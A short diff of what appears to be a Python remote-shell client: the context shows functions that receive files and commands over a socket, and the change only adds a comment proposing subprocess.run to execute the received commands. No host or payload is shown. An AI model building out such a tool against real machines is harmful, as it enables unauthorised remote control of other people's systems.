@@ -21,6 +21,7 @@ def upload(file_name):
     file_upload.write(data_recv)
 
 def get_command():
+    # Update 21/11/2022: Instead of using some complexible command below, we can use `subprocess.run([command], capture_output=True)` for all of this
     while True:
         command = sock.recv(2048)
         command = command.decode()
